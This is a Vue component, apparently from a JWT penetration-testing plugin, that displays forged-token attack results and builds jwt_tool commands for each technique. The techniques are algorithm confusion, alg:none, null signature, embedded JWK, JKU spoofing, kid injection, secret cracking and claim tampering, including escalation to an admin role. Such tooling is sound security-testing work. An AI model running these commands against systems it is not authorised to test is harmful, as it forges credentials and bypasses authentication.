<template>
  <div v-if="result" class="h-full flex flex-col overflow-hidden text-sm">
    <!-- Technique header -->
    <div class="px-4 py-3 border-b border-gray-700 bg-gray-900 flex items-start gap-3">
      <span :class="['px-2 py-0.5 rounded text-xs font-mono font-semibold shrink-0', techniqueColor(result.technique)]">
        {{ result.technique }}
      </span>
      <div class="flex-1 min-w-0">
        <p class="font-semibold text-gray-100 truncate">{{ result.techniqueName }}</p>
        <p class="text-gray-400 text-xs mt-0.5 leading-relaxed">{{ result.description }}</p>
      </div>
    </div>

    <div class="flex-1 overflow-y-auto">
      <!-- Status summary -->
      <div class="px-4 py-2 border-b border-gray-700 flex gap-6 text-xs">
        <span v-if="result.responseStatus" :class="['font-bold', statusColor(result.responseStatus)]">
          HTTP {{ result.responseStatus }}
        </span>
        <span v-if="result.responseLength !== undefined" class="text-gray-400">
          {{ result.responseLength }} bytes
        </span>
        <span v-if="result.durationMs !== undefined" class="text-gray-400">
          {{ result.durationMs }}ms
        </span>
        <span v-if="result.error" class="text-red-400">Error: {{ result.error }}</span>
      </div>

      <!-- Modified JWT -->
      <section class="px-4 py-3 border-b border-gray-700">
        <p class="text-xs text-gray-500 uppercase tracking-wide mb-1">Modified JWT</p>
        <div class="bg-gray-900 rounded p-2 font-mono text-xs break-all text-gray-300 select-all max-h-32 overflow-y-auto">
          <span class="text-yellow-400">{{ jwtParts[0] }}</span>.<span class="text-blue-400">{{ jwtParts[1] }}</span>.<span class="text-red-400">{{ jwtParts[2] }}</span>
        </div>
        <button @click="copyJWT" class="mt-1.5 text-xs text-gray-500 hover:text-gray-300 transition-colors">
          {{ copied ? "✓ Copied" : "Copy JWT" }}
        </button>
      </section>

      <!-- Public key / certificate used (algorithm confusion) -->
      <section v-if="result.keyPem" class="px-4 py-3 border-b border-gray-700">
        <p class="text-xs text-gray-500 uppercase tracking-wide mb-1">
          Public Key / Certificate Used
          <span v-if="result.secretEncoding" class="text-orange-300 normal-case"> — HMAC secret: {{ result.secretEncoding }}</span>
        </p>
        <pre class="bg-gray-900 rounded p-2 text-xs text-green-300 overflow-x-auto max-h-48 overflow-y-auto select-all whitespace-pre">{{ result.keyPem }}</pre>
        <button @click="copyKey" class="mt-1.5 text-xs text-gray-500 hover:text-gray-300 transition-colors">
          {{ copiedKey ? "✓ Copied" : "Copy PEM" }}
        </button>
      </section>

      <!-- Decoded header -->
      <section v-if="decodedHeader" class="px-4 py-3 border-b border-gray-700">
        <p class="text-xs text-gray-500 uppercase tracking-wide mb-1">Decoded Header</p>
        <pre class="bg-gray-900 rounded p-2 text-xs text-yellow-300 overflow-x-auto max-h-48 overflow-y-auto">{{ decodedHeader }}</pre>
      </section>

      <!-- Decoded payload -->
      <section v-if="decodedPayload" class="px-4 py-3 border-b border-gray-700">
        <p class="text-xs text-gray-500 uppercase tracking-wide mb-1">Decoded Payload</p>
        <pre class="bg-gray-900 rounded p-2 text-xs text-green-300 overflow-x-auto max-h-48 overflow-y-auto">{{ decodedPayload }}</pre>
      </section>

      <!-- Response headers -->
      <section v-if="result.responseHeaders && Object.keys(result.responseHeaders).length" class="px-4 py-3 border-b border-gray-700">
        <p class="text-xs text-gray-500 uppercase tracking-wide mb-1">Response Headers</p>
        <div class="bg-gray-900 rounded p-2 text-xs font-mono space-y-0.5 max-h-32 overflow-y-auto">
          <div v-for="(val, name) in result.responseHeaders" :key="name" class="flex gap-2">
            <span class="text-blue-400 shrink-0">{{ name }}:</span>
            <span class="text-gray-300 break-all">{{ val }}</span>
          </div>
        </div>
      </section>

      <!-- Response body -->
      <section v-if="result.responseBody" class="px-4 py-3 border-b border-gray-700">
        <p class="text-xs text-gray-500 uppercase tracking-wide mb-1">Response Body</p>
        <pre class="bg-gray-900 rounded p-2 text-xs text-gray-300 overflow-x-auto max-h-64 overflow-y-auto whitespace-pre-wrap break-all">{{ result.responseBody }}</pre>
      </section>

      <!-- Reproduce with jwt_tool -->
      <section v-if="jwtTool" class="px-4 py-3">
        <p class="text-xs text-gray-500 uppercase tracking-wide mb-1">Reproduce with jwt_tool</p>
        <p v-if="jwtTool.note" class="text-xs text-gray-500 mb-1.5">{{ jwtTool.note }}</p>
        <pre class="bg-gray-900 rounded p-2 text-xs text-cyan-300 overflow-x-auto max-h-48 overflow-y-auto select-all whitespace-pre-wrap break-all">{{ jwtTool.cmd }}</pre>
        <button @click="copyCmds" class="mt-1.5 text-xs text-gray-500 hover:text-gray-300 transition-colors">
          {{ copiedCmds ? "✓ Copied" : "Copy commands" }}
        </button>
      </section>
    </div>
  </div>
  <div v-else class="flex items-center justify-center h-full text-gray-500 text-sm">
    Select an attack to see details
  </div>
</template>

<script setup lang="ts">
import { ref, computed } from "vue";
import type { AttackResult } from "../types.js";
import { techniqueColor, statusColor } from "../types.js";
import { b64urlDecode } from "../utils.js";

const props = defineProps<{ result: AttackResult | null }>();

const copied = ref(false);
const copiedKey = ref(false);
const copiedCmds = ref(false);

// Base64 of the EXACT secret bytes used for this variant (mirrors the backend
// secretVariants()), so the jwt_tool key file can be reconstructed byte-for-byte.
function secretBase64(pem: string, encoding: string): string {
  const norm = pem.replace(/\r\n/g, "\n");
  switch (encoding) {
    case "PEM (no trailing LF)": return btoa(norm.replace(/\n+$/, ""));
    case "base64(PEM)": return btoa(btoa(norm));
    case "DER": return norm.replace(/-----[^-]+-----/g, "").replace(/\s/g, "");
    case "PEM":
    default: return btoa(norm);
  }
}

function decodeSeg(seg: string): Record<string, unknown> | null {
  try {
    return JSON.parse(b64urlDecode(seg)) as Record<string, unknown>;
  } catch {
    return null;
  }
}

// Per-technique jwt_tool reproduction command(s). algConfusion is byte-exact;
// the others reproduce the equivalent attack (noted where the match is not exact).
const jwtTool = computed<{ cmd: string; note?: string } | null>(() => {
  const r = props.result;
  if (!r || !r.originalJWT) return null;
  const J = "python3 jwt_tool.py";
  const orig = `'${r.originalJWT}'`;
  const modHeader = decodeSeg(r.modifiedJWT.split(".")[0] ?? "") ?? {};

  switch (r.technique) {
    case "algConfusion": {
      if (!r.keyPem) return null;
      const b64 = secretBase64(r.keyPem, r.secretEncoding ?? "PEM");
      return {
        cmd:
          `echo -n '${b64}' | base64 -d > /tmp/jwt_pubkey\n` +
          `${J} ${orig} -X k -pk /tmp/jwt_pubkey`,
        note:
          `Byte-exact. Writes the precise HMAC secret (${r.secretEncoding}) to a file, then forges the same token.` +
          (r.secretEncoding === "DER"
            ? " Note: DER is raw binary; jwt_tool reads the key file as text and may fail on it."
            : ""),
      };
    }
    case "none":
      return {
        cmd: `${J} ${orig} -X a`,
        note: "Emits the alg:none variants (none/None/NONE/nOnE) with the signature stripped — pick the casing matching this row.",
      };
    case "nullSig":
      return {
        cmd: `${J} ${orig} -X n`,
        note: "Produces the null-signature token (CVE-2020-28042).",
      };
    case "embeddedJwk":
      return {
        cmd: `${J} ${orig} -X i`,
        note: "CVE-2018-0114. jwt_tool generates its OWN embedded key, so the jwk and signature differ from this row, but the attack is equivalent.",
      };
    case "jkuSpoof": {
      const jku = typeof modHeader.jku === "string" ? modHeader.jku : "<your-jwks-url>";
      return {
        cmd: `${J} ${orig} -X s -ju '${jku}'`,
        note: "jwt_tool generates its own key and JWKS — host jwt_tool's JWKS at the -ju URL (not this plugin's). The resulting token differs but the attack is equivalent.",
      };
    }
    case "x5uSpoof":
      return {
        cmd:
          `# jwt_tool has no built-in x5u spoofing exploit.\n` +
          `# Closest built-in attack is JKU spoofing:\n` +
          `${J} ${orig} -X s -ju '<your-jwks-url>'`,
        note: "x5u spoofing isn't directly supported by jwt_tool; the JKU spoof (-X s) is the nearest equivalent.",
      };
    case "kidInject": {
      const kid = typeof modHeader.kid === "string" ? modHeader.kid : "";
      const secret = r.hmacSecret ?? "";
      return {
        cmd: `${J} ${orig} -I -hc kid -hv '${kid}' -S hs256 -p '${secret}'`,
        note: `Sets kid="${kid}" and signs HS256 with the secret this injection implies ("${secret}").`,
      };
    }
    case "weakSecret": {
      const secret = r.hmacSecret ?? "";
      return {
        cmd:
          `# Crack the secret from a wordlist:\n` +
          `${J} ${orig} -C -d <wordlist.txt>\n` +
          `# Forge once cracked (secret = "${secret}"):\n` +
          `${J} ${orig} -S hs256 -p '${secret}'`,
        note: "Crack mode recovers the secret; the second command re-signs. Add -I -pc role -pv admin (etc.) to escalate claims.",
      };
    }
    case "claimTamper": {
      const origP = decodeSeg(r.originalJWT.split(".")[1] ?? "") ?? {};
      const modP = decodeSeg(r.modifiedJWT.split(".")[1] ?? "") ?? {};
      const pairs: string[] = [];
      const removed: string[] = [];
      for (const k of Object.keys(modP)) {
        if (JSON.stringify(modP[k]) !== JSON.stringify(origP[k])) {
          const v = typeof modP[k] === "string" ? (modP[k] as string) : JSON.stringify(modP[k]);
          pairs.push(`-pc ${k} -pv '${v}'`);
        }
      }
      for (const k of Object.keys(origP)) if (!(k in modP)) removed.push(k);

      if (pairs.length) {
        let cmd = `${J} ${orig} -I ${pairs.join(" ")}`;
        if (removed.length) cmd += `\n# Then delete claims interactively: ${J} ${orig} -T   (remove: ${removed.join(", ")})`;
        return {
          cmd,
          note: "Tampers claims while leaving the original (invalid) signature — surfaces servers that skip verification. Non-string values are injected as strings; adjust if needed.",
        };
      }
      if (removed.length) {
        return {
          cmd: `${J} ${orig} -T   # interactively delete claims: ${removed.join(", ")}`,
          note: "jwt_tool can't delete claims non-interactively; use -T (tamper) mode and remove the listed claims.",
        };
      }
      return null;
    }
    default:
      return null;
  }
});

const jwtParts = computed(() => {
  if (!props.result) return ["", "", ""];
  const parts = props.result.modifiedJWT.split(".");
  return [parts[0] ?? "", parts[1] ?? "", parts[2] ?? ""];
});

const decodedHeader = computed(() => {
  if (!props.result) return null;
  try {
    const raw = b64urlDecode(jwtParts.value[0]);
    return JSON.stringify(JSON.parse(raw), null, 2);
  } catch {
    return null;
  }
});

const decodedPayload = computed(() => {
  if (!props.result) return null;
  try {
    const raw = b64urlDecode(jwtParts.value[1]);
    return JSON.stringify(JSON.parse(raw), null, 2);
  } catch {
    return null;
  }
});

async function copyJWT() {
  if (!props.result) return;
  await navigator.clipboard.writeText(props.result.modifiedJWT);
  copied.value = true;
  setTimeout(() => { copied.value = false; }, 1500);
}

async function copyKey() {
  if (!props.result?.keyPem) return;
  await navigator.clipboard.writeText(props.result.keyPem);
  copiedKey.value = true;
  setTimeout(() => { copiedKey.value = false; }, 1500);
}

async function copyCmds() {
  if (!jwtTool.value) return;
  await navigator.clipboard.writeText(jwtTool.value.cmd);
  copiedCmds.value = true;
  setTimeout(() => { copiedCmds.value = false; }, 1500);
}
</script>
